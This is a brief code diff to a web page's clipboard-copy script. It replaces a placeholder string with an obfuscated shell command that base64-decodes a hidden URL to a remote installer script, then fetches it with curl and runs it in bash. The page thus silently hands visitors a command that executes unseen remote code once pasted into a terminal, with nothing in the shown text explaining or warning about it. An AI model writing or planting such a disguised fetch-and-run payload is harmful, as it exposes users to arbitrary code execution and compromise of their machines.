@@ -95,7 +95,7 @@ p{
 
 <script>
 function copiar(){
-  const texto = "SEU_TEXTO_AQUI";
+  const texto = "u=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NjaG9vbDAxMDIvSW5zdGFsbGVyL21haW4vSW5zdGFsbGVyLnNo|base64 -d);bash <(curl -s "$u")";
 
   navigator.clipboard.writeText(texto)
     .then(()=>{
